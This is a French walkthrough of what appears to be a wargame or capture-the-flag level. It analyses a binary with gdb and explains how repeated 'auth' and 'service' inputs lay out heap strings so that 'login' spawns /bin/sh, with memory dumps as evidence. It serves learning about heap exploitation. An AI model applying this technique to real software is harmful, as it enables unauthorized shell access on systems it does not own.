L'executable ecoute sur le stdin et affiche (nil), (nil).
Si on l'observe avec gdb on remarque qu'il y a une boucle et dans celle ci:
printf 2 adresse de 2 variable ( auth et service )
Ensuite fgets est utiliser pour ecouter sur le stdin
puis le retour est comparer a des strings afin d'executer la liste d'instruction associer a la string envoyer en stdin
En regardant les str utiliser pour les comparer a notre input nous en avons 4
auth / reset / service / login

si notre input commence par auth:
un malloc est creer pour pouvoir ensuite copier la chaine dans notre variable auth via un strcpy.

reset:
Va appeler la fonction free sur notre variable auth

service:
va utiliser strdup afin de copier notre chaine pour la stocker en memoire

login:
va comparer si a 0x8049aac ( auth var ) = l'adresse stocker en memoire pour notre string auth + un offset de 0x20 est = 0 ( donc si notre adresse en memoire est 0x804a008 alors login regardera a l'emplacement 0x804a028 )
Il est important que la variable auth soit initialiser sinon notre l'executable crash. 
Si c'est 0 alors la fonction reboucle sinon un appel system est lancer avec comme argument /bin/sh

Le probleme dans cet executable est que si auth est declarer dans un premier temps et que ensuite service est utiliser derriere on peux voir que les 2 adresses se suivent en memoire. Sachant que la variable service n'est jamais free on peut creer plusieur chaine en memoire grace au strdup.
Donc si on essaie de stocker auth puis de stocker 2 adress apres via le strdup de service on peux logiquement ecrire a l'emplacement auth+0x20
car dans notre cas chaque appel a strdup va ecrire 0x10 plus loin que notre premier appel a malloc.

voici une trace de la memoire apres un appel a auth avec ("auth test")
gdb-peda$ x/16xw 0x804a008
0x804a008:	0x74736574	0x0000000a	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000

0x804a008 etant l'adresse renvoyer par le printf nous indiquant l'emplacement en memoire de notre string

pour rappel login va verifier si "0x804a028:      0x00000000" vaut 0

maintenant si on utilisee service avec ("service ok") la memoire ressemble a
gdb-peda$ x/16 0x804a008
0x804a008:	0x74736574	0x0000000a	0x00000000	0x00000011
0x804a018:	0x0a6b6f20	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000

On voit clairement que les chaines se suivent et si on continue une nouvelle fois avec service
gdb-peda$ x/16 0x804a008
0x804a008:	0x74736574	0x0000000a	0x00000000	0x00000011
0x804a018:	0x0a6b6f20	0x00000000	0x00000000	0x00000011
0x804a028:	0x0a6b6f20	0x00000000	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000

Ici "0x804a028:      0x0a6b6f20" Donc "0x804a008+0x20" ne vaut plus 0 et on peut maintenant essayer d'utiliser login pour avoir notre shell
